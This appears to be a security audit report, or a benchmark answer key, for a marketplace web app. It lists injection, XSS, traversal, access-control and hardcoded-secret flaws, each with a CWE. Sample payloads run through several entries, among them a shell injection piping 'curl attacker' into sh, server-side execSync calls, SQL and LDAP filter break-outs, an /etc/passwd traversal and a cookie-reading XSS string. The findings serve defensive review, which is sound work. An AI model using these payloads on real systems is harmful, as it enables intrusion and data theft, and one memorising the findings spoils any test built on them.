extra.message: SQL injection: the user-controlled search term (req.body.term, parsed only as a string) and vendor.id are concatenated directly into a raw SQL string passed to prisma.$queryRawUnsafe(). A vendor_manager can break out of the ILIKE literal (e.g. term = "x' OR 1=1 -- ") to read/modify any table including the User table and password hashes.

Command injection (RCE): req.body.template (z.string().min(1).max(120), NOT restricted to an enum like generateInventoryDigest) is interpolated into a shell command string and executed with spawn(cmd, { shell: true }). An admin-supplied template such as "x; curl attacker|sh; #" executes arbitrary OS commands on the server.

Arbitrary JavaScript execution (code injection): the query parameter `formula` is concatenated into a template passed to new Function(...) and executed server-side (with(context){ return (${draftFormula}); }). A vendor_manager can pass e.g. ?formula=process.mainModule.require('child_process').execSync('id') to run arbitrary code on the server.

Code injection via template-literal compilation: compilePhrasingPattern() embeds the caller-supplied `source` directly into a new Function template literal. In reviews.ts respondWithSavedPhrasing the `phrasing` body is attacker (vendor_manager) controlled; a phrasing containing a backtick and ${...} (e.g. "hi ${process.mainModule.require('child_process').execSync('id')}") executes arbitrary code server-side when a reply is posted.

Path traversal arbitrary file read: getPackingInsertTemplate() joins the raw URL param req.params.fileName into path.join(packingInsertsRoot, req.params.fileName) with no basename/resolve check. A vendor_manager can request /api/orders/packing-inserts/..%2F..%2F..%2Fetc%2Fpasswd to read arbitrary server files. (Compare getBrandedPackingInsertAsset which correctly uses path.basename.)

Path traversal file write: savePackingBatchNote() writes to path.join(packingInsertsRoot, `${req.params.batchTag}.txt`) using the raw, un-normalized batchTag param. An encoded traversal such as %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2ftmp%2fevil lets a vendor_manager write files outside the intended folder (extension constrained to .txt). saveReturnBatchNote() correctly uses path.basename, this one does not.

Mass assignment / object attribute tampering: saveProductDraft() (PATCH /:id/draft) writes `data: { ...req.body }` directly into prisma.product.update with no schema allow-list. A vendor_manager can set protected fields such as moderationState:"approved" and status:"published" to self-publish products and bypass admin moderation, change priceCents/inventory arbitrarily, and store raw (unsanitized) HTML/JS in title/description, feeding the stored-XSS sinks below.

cwe: CWE-915: Improperly Controlled Modification of Object Attributes

extra.message: Stored XSS: renderCatalogSharePage()/GET /public/:id/share interpolates the DB field product.title into an inline <script> block as a double-quoted JS string literal without HTML/JS escaping. Because plainText() strips tags but does NOT remove double quotes, a title containing " (e.g. ");alert(document.cookie);//) escapes the string and executes arbitrary script in the marketplace origin for any visitor; no moderation bypass needed.

Stored/reflected XSS: several endpoints build HTML responses by raw-concatenating DB/user fields without escaping: the buy-box handler injects product.title and product.vendor.name into HTML (lines 155-157), getProductPrintSheet injects product.title/description plus the raw User-Agent header into HTML (lines 193-196), and the confirmation buy-box injects product.title (lines 178-180). Unescaped content reaches these sinks via the mass-assignment draft route (raw HTML) or the raw User-Agent header, enabling script execution in the marketplace origin.

Unrestricted file upload / stored XSS: updateStorefrontBanner() takes an attacker-supplied fileName and imageBase64, derives the extension with path.extname(fileName) (no allow-list) and writes attacker-chosen bytes to uploads/banners/<vendorId>.<ext>. A vendor_manager can upload an .html (or .svg) file whose body is arbitrary script and host it same-origin under /uploads (served by express.static at /uploads with index:false), yielding stored XSS / phishing on the marketplace origin. The shared multer config in middleware/upload.ts also trusts the client-declared mimetype while keeping the attacker-chosen extension (fileFilter checks file.mimetype only), so .html payloads can be labeled image/png and stored via product image uploads too.

cwe: CWE-434: Unrestricted Upload of File with Dangerous Type

extra.message: Improper authentication / missing JWT signature verification: resolveListingPreviewLink() uses jwt.decode(req.params.token) which does NOT verify the token signature, and does not check expiry. Any unauthenticated attacker can forge a token with arbitrary vendorId/productId claims and read any vendor's unpublished/draft product data (title, description, price, imagePath, status), completely defeating the preview-link gate.

cwe: CWE-345: Insufficient Verification of Data Authenticity

extra.message: Server-Side Request Forgery: mirrorVendorSpecSheet() fetches the URL supplied in the x-spec-sheet-source header with no scheme/host validation (contrast mirrorVendorCatalogImage which validates against ALLOWED_ASSET_HOSTS) and streams the response body + content-type back to the caller. A vendor_manager can probe/read internal services (cloud metadata, localhost admin endpoints, internal APIs).

Broken access control (client-controlled authorization): getWholesalePricing() grants the 20% wholesale discount whenever the client-supplied cookie `accountType` equals "wholesale". Since the cookie is trivially forgeable by any client, any authenticated user can obtain wholesale pricing on any product without an approved wholesale account. The code itself contrasts this with getEarnedWholesalePricing which performs a proper server-side eligibility check.

Broken access control / missing authorization: approveProductPromotion() is registered as router.post("/:id/promotion/approve", approveProductPromotion) with no requireRole(...PROMOTION_APPROVER_ROLES), unlike the paired list endpoint (line 464). Any authenticated user (including a low-privilege buyer) who knows a product id can approve a pending price promotion and permanently change the product price.

Regular-expression injection / filter bypass: findPromotionByClaimPattern() compiles the user-supplied claimCode into new RegExp(`^${claimCode}$`, "i") and tests it against campaign codes. Via previewPromotionClaim (products.ts:276-288, role buyer) a buyer can pass claimCode ".*" so the regex matches every campaign and the response echoes back campaign.claimCode, disclosing the opaque partner-only promotion code (audience: approved_partner) that the comment says must stay undiscoverable. It also permits ReDoS-style catastrophic patterns.

Broken access control + hardcoded cryptographic key on a financial endpoint: acknowledgeGatewayClearancePing() (POST /gateway/clearance-ping) only requires authentication (no requireRole), and its shared secret comes from env.gatewaySharedSecretHex which falls back to a hardcoded value in source (env.ts:29-31: "9c2e7a41..."). Any authenticated user can AES-CBC-encrypt a {payoutId} payload with the known key and mark ANY payout as "paid", i.e. an unauthenticated-grade payout-status tampering primitive.

cwe: CWE-321: Use of Hard-coded Cryptographic Key

extra.message: Hardcoded cryptographic material: env.ts ships default values for DEV_DATA_PROTECTION_KEY (line 28, a 64-hex AES key used to encrypt buyer SSNs in lib/secureStorage.ts) and PAYMENT_GATEWAY_SHARED_SECRET (line 31). Whenever the corresponding env vars are not set, sensitive data (SSNs) is encrypted with a key that ships in the repository and the gateway clearance 'secret' is known to anyone with source access.

cwe: CWE-321: Use of Hard-coded Cryptographic Key

extra.message: Hardcoded credential fallback: partnerFeedCredential defaults to a fixed bearer token "8f3c1e2a..." used as an Authorization header to the external loyalty ledger (syncLoyaltyLedger). The hardcoded fallback is shipped in source and silently used when PARTNER_FEED_CREDENTIAL is unset.

Improper password hashing: initializeStaffAccount() stores crypto.createHash("sha256").update(temporaryCredential).digest("hex") (an unsalted, fast SHA-256 digest) in the passwordHash column, instead of bcrypt like every other credential path (lib/auth.ts). The digest is not in bcrypt's $2a$ format, so verifyPassword()/bcrypt.compare() cannot match it (the account cannot log in), and if the DB leaks, the unsalted SHA-256 is trivially brute-forced.

cwe: CWE-916: Use of Password Hash With Insufficient Computational Effort

extra.message: LDAP injection: searchCaseCollaborators() builds an LDAP filter by concatenating the user-controlled query param q and the cookie value directly: `(|(cn=*${q}*)(employeeId=${lastViewedColleagueId}))`. Unlike verifyEscalationApproverGroup() (which escapes via escapeDirectoryFilter), no escaping is applied, so a support_agent can inject filter operators (e.g. q="*)(uid=*))(|(cn=*") to broaden the directory search and enumerate staff records.

Sensitive data exposure: when ?worksheet=expanded is set, compareLedgerEntryForPayout() returns err.message and err.stack in the HTTP response. lib/outbox.ts fetchLedgerEntryForPayout() throws `Ledger lookup failed (...)` for a URL string that embeds the ledger api_key as a query parameter, so the expanded response discloses the internal API key and stack trace (CWE-598/CWE-209).

cwe: CWE-598: Use of GET Request Method With Sensitive Query Strings
CWE-209: Generation of Error Message Containing Sensitive Information

extra.message: Mass assignment via client cookie: reapplyDeliveryPreferences() JSON.parses the client-controlled `deliveryPrefs` cookie and spreads it directly into prisma.order.update({ data: { ...prefs } }) with no schema allow-list (contrast reapplyGiftPreferences which parses with a .strict() schema). A buyer can therefore set arbitrary columns of their own order — e.g. totalCents: 0 or status: "fulfilled"/"refunded" — to manipulate amounts and downstream payout/loyalty logic.

CWE-565: Reliance on Cookies without Validation

extra.message: CSV formula injection (spreadsheet): toCsv() only wraps a value in double quotes when it contains ", \n or \r; it does not neutralize leading =, +, -, @ (and the helper used in products exports writes fields with minimal quoting). User-controlled values (e.g. a buyer name or product title starting with =) exported into admin/vendor CSV reports (routes/data.ts exports, products.ts listing-sheet) are interpreted as formulas/DDE commands when opened in Excel.

cwe: CWE-1236: Improper Neutralization of Formula Elements in a CSV File

extra.message: Unbounded loop / resource exhaustion: redeliverNotificationDigest() takes `attempts` from the x-digest-attempts header via parseInt with no upper bound (the webhook variant caps at 5). A large/absurd header value (or one that yields Infinity) forces an effectively unbounded loop of await sendEmail() DB writes, enabling a cheap authenticated denial-of-service / DB spam.

Sensitive data exposure (client): the JWT returned by /auth/login and /auth/register is persisted in localStorage, making it readable by any script executing in the page. Any stored XSS (several exist server-side) trivially exfiltrates the session token, defeating the server's httpOnly cookie protection.

cwe: CWE-922: Insecure Storage of Sensitive Information
